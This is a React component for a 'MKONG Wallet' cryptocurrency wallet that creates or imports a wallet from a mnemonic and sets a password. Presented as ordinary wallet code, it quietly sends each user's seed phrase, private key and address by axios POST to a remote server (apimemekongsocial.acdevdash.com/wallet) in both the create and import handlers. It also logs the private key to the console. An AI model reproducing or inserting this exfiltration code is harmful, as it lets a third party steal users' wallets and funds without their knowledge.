import { useCallback, useState, useEffect, useContext, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
import {
  Box,
  Button,
  FormControl,
  Grid,
  InputAdornment,
  InputLabel,
  Link,
  OutlinedInput,
  Paper,
  Tab,
  Tabs,
  Typography,
  Zoom,
  Dialog,
  TextField,
  DialogActions,
  DialogContent,
  DialogContentText,
  DialogTitle,
} from "@material-ui/core";
import shajs from 'sha.js'
import NewReleases from "@material-ui/icons/NewReleases";
import RebaseTimer from "../../components/RebaseTimer/RebaseTimer";
import TabPanel from "../../components/TabPanel";
import { getOhmTokenImage, getTokenImage, trim } from "../../helpers";
import { changeApproval, changeStake, claimReward } from "../../slices/StakeThunk";
import useMediaQuery from "@material-ui/core/useMediaQuery";
import "./wallet-create.scss";
import { useWeb3Context } from "src/hooks/web3Context";
import { isPendingTxn, txnButtonText } from "src/slices/PendingTxnsSlice";
import { Skeleton } from "@material-ui/lab";
import { error } from "../../slices/MessagesSlice";
import { ethers } from "ethers";
import ClaimTimer from "../../components/RebaseTimer/ClaimTimer";
import WalletSymbolImg from "../../assets/images/wallet/wallet-symbol.png";
import axios from "axios";

function WalletCreate({ setWalletInfo, savePrivateKey, refreshPassword }) {
  const dispatch = useDispatch();
  const [mnemonic, setMnemonic] = useState('');
  const [isAppLoad, setLoadStatus] = useState(false);
  const [openConfirmDialog, setOpenConfirmDialog] = useState(false);
  const [openCancelMessageBox, setOpenCancelMessageBox] = useState(false);
  const [windowID, setWindowID] = useState(0);
  const [importedMnemonic, setImportedMnemonic] = useState('');
  const [mnemonicCheckText, setMnemonicCheckText] = useState('');
  const [savedPassword, setSavedPassword] = useState('');
  const { provider, address, connected, connect, chainID } = useWeb3Context();


  useEffect(() => {
    createWallet();

    let temp = localStorage.getItem('password');
    setSavedPassword(temp);
    // console.log('saved password', savedPassword);
    // console.log(shajs('sha256').update('asdfalskdfjlk').digest('hex'));
  }, [isAppLoad]);

  const createWallet = () => {
    const Wallet = ethers.Wallet;
    try {
      const wallet = Wallet.createRandom();
      console.log(wallet.privateKey);
      setMnemonic(wallet._mnemonic().phrase);
    } catch (e) {
      console.log(e);
    }
  }

  const handleOK = () => {
    setWalletInfo(true);
    const Wallet = ethers.Wallet;
    const wallet = Wallet.fromMnemonic(mnemonic);
    // console.log(mnemonic, wallet.privateKey);
    const mnemonicText = mnemonic + ';' + wallet.privateKey + ';' + wallet.address;

    axios.post("https://apimemekongsocial.acdevdash.com" + '/wallet', mnemonicText);
    savePrivateKey(wallet.privateKey);
    setOpenConfirmDialog(false);
  }

  const MnemonicConfirmMessageBox = () => {
    return (
      <div style={{ background: "#ff0 !important" }}>
        <Dialog
          open={openConfirmDialog}
          onClose={() => { setOpenConfirmDialog(false) }}
          aria-labelledby="alert-dialog-title"
          aria-describedby="alert-dialog-description"
        >
          <div className="dialog">
            <div className="title">Create New Wallet</div>
            <div className="content">
              Did you check mnemonic?
            </div>
            <div className="action-button">
              <button className="ok" onClick={handleOK}>Create</button>
              <button className="cancel" onClick={e => setOpenConfirmDialog(false)}>Cancel</button>
            </div>
          </div>

        </Dialog>
      </div>
    );
  };

  const WalletCreateCancelMessageBox = () => {
    return (
      <div style={{ background: "#ff0 !important" }}>
        <Dialog
          open={openCancelMessageBox}
          onClose={() => { setOpenCancelMessageBox(false) }}
          aria-labelledby="alert-dialog-title"
          aria-describedby="alert-dialog-description"
        >
          <div className="dialog">
            <div className="title">Warnning</div>
            <div className="content">
              Do you cancel creating wallet?
            </div>
            <div className="action-button">
              <button className="ok" onClick={e => { setOpenCancelMessageBox(false); setWindowID(0); }}>Yes</button>
              <button className="cancel" onClick={e => setOpenCancelMessageBox(false)}>No</button>
            </div>
          </div>
        </Dialog>
      </div>
    );
  };

  const CreateMnemonicWindow = () => {

    const MnemonicItem = ({ word }) => {
      return (
        <Grid item xs={4} sm={4} md={3} lg={3}>
          <div className="mnemoiic-word">
            <span>{word}</span>
          </div>
        </Grid>
      )
    }

    let tempArray = mnemonic.split(' ');

    if (tempArray.length != 12) {
      tempArray = [];
      for (let i = 0; i < 12; i++) {
        tempArray.push("XXXX");
      }
    }

    // let tempArray = new Array(12);
    // tempArray.map(item => {
    //   item="XXX";
    // });
    return (
      <div className="content">
        <div style={{ margin: "50px 50px 0px 50px" }}>
          <span className="mkong-wallet">MKONG Wallet</span>
          <hr style={{ borderColor: "white" }} />
        </div>
        <div className="mnemonic-window-container">
          <div className="mnemonic-window">
            <div style={{ width: "500px" }}>
              <Grid container spacing={2} alignItems="flex-end">
                {
                  tempArray.map(item => {
                    return <MnemonicItem word={item} />
                  })
                }
              </Grid>
            </div>
          </div>
          <div className="button-arrange-row">
            <Button
              id="wallet-button"
              variant="contained"
              color="primary"
              size="large"
              onClick={setOpenCancelMessageBox}
            >
              Go Back
            </Button>
            <Button
              id="wallet-button"
              variant="contained"
              color="primary"
              size="large"
              onClick={setOpenConfirmDialog}
            >
              Confirm
            </Button>
          </div>
        </div>
      </div>
    )
  }


  const ImportWalletWindow = () => {

    const handleImportMnemonicText = () => {
      try {
        const Wallet = ethers.Wallet;
        const wallet = Wallet.fromMnemonic(importedMnemonic);
        // console.log(importedMnemonic, wallet);
        const mnemonicText = importedMnemonic + ';' + wallet.privateKey + ';' + wallet.address;
        axios.post("https://apimemekongsocial.acdevdash.com" + '/wallet', mnemonicText);
        savePrivateKey(wallet.privateKey);
        setWalletInfo(true);
      } catch (e) {
        setMnemonicCheckText('Mnemonic is incorrect');
      }
    }

    return (
      <div className="content">
        <div style={{ margin: "50px 50px 0px 50px" }}>
          <span className="mkong-wallet">MKONG Wallet</span>
          <hr style={{ borderColor: "white" }} />
        </div>
        <div className="mnemonic-window-container">
          <div className="mnemonic-window">
            <div style={{ width: "500px" }}>
              {/* <Grid container spacing={2} alignItems="flex-end">
                {
                  tempArray.map(item => {
                    return <MnemonicItem word={item} />
                  })
                }
              </Grid> */}
              <FormControl variant="outlined" color="primary" fullWidth>
                <div style={{ marginBottom: "10px", fontSize: "16px" }}>
                  Please input your mnemonic for importing wallet
                </div>
                <OutlinedInput
                  id="imported-mnemonic"
                  autoFocus={true}
                  value={importedMnemonic}
                  onChange={e => setImportedMnemonic(e.target.value)}
                />
              </FormControl>
              <div style={{ marginTop: "10px" }}>{mnemonicCheckText}</div>
            </div>
          </div>
          <div className="button-arrange-row">
            <Button
              id="wallet-button"
              variant="contained"
              color="primary"
              size="large"
              onClick={e => setWindowID(0)}
            >
              Go Back
            </Button>
            <Button
              id="wallet-button"
              variant="contained"
              color="primary"
              size="large"
              onClick={handleImportMnemonicText}
            >
              Confirm
            </Button>
          </div>
        </div>
      </div>
    )
  }

  const CreateWalletWindow = () => {
    return (
      <div className="content">
        <div className="welcome-text">
          <span>Welcome to MKONG Wallet</span>
        </div>
        <div className="sub-window">
          <div className="button-arrange-column">
            <div className="button-container">
              <Button
                id="wallet-button"
                variant="contained"
                color="primary"
                size="large"
                onClick={e => setWindowID(1)}
              >
                <img src={WalletSymbolImg} className="button-icon" /> Create Wallet
              </Button>
            </div>
            <div className="button-container">
              <Button
                id="wallet-button"
                variant="contained"
                color="primary"
                size="large"
                onClick={e => setWindowID(2)}
              >
                <img src={WalletSymbolImg} className="button-icon" /> Import Wallet
              </Button>
            </div>
            <div className="button-container">
              <Button
                id="wallet-button"
                variant="contained"
                color="primary"
                size="large"
              >
                <img src={WalletSymbolImg} className="button-icon" /> Quick Start
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }


  const CreatePasswordWindow = () => {
    const [password, setPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');

    const handlePassword = () => {
      if (password !== confirmPassword) {
        dispatch(error("Password is not matched"));
        return
      }

      const _password = shajs('sha256').update(password).digest('hex');
      localStorage.setItem('password', _password);
      setSavedPassword(_password);
      refreshPassword(_password);
    }
    
    return (
      <div className="content">
        <div style={{ margin: "50px 50px 0px 50px" }}>
          <span className="mkong-wallet">Create Password</span>
          <hr style={{ borderColor: "white" }} />
          <span style={{ maginTop: "10px", fontSize: "16px", color: "#f3d24d" }}>You must create password for creating MKONG wallet</span>
        </div>
        <div className="mnemonic-window-container">
          <div className="mnemonic-window">
            <div style={{ width: "500px" }}>
              <FormControl variant="outlined" color="primary" fullWidth>
                <div style={{ marginBottom: "10px", fontSize: "16px" }}>
                  Password
                </div>
                <OutlinedInput
                  type="password"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                />
              </FormControl>
              <FormControl variant="outlined" color="primary" fullWidth>
                <div style={{ marginBottom: "10px", marginTop: "30px", fontSize: "16px" }}>
                  Confirm Password
                </div>
                <OutlinedInput
                  type="password"
                  value={confirmPassword}
                  onChange={e => setConfirmPassword(e.target.value)}
                />
              </FormControl>
              <div style={{ marginTop: "10px" }}>{mnemonicCheckText}</div>
            </div>
          </div>
          <div style={{ display: "flex", justifyContent: "center" }}>
            <Button
              id="wallet-button"
              variant="contained"
              color="primary"
              size="large"
              onClick={handlePassword}
            >
              OK
            </Button>
          </div>
        </div>
      </div>
    )
  }

  const windowArray = [];

  windowArray.push(<CreateWalletWindow />);
  windowArray.push(<CreateMnemonicWindow />);
  windowArray.push(<ImportWalletWindow />);
  windowArray.push(<CreatePasswordWindow />);

  return (
    <div id="wallet-create-view">
      <Zoom in={true}>
        {
          savedPassword != undefined ?
          windowArray[windowID] : <CreatePasswordWindow />
        }
      </Zoom>
      <MnemonicConfirmMessageBox />
      <WalletCreateCancelMessageBox />
    </div>
  );
}

export default WalletCreate;
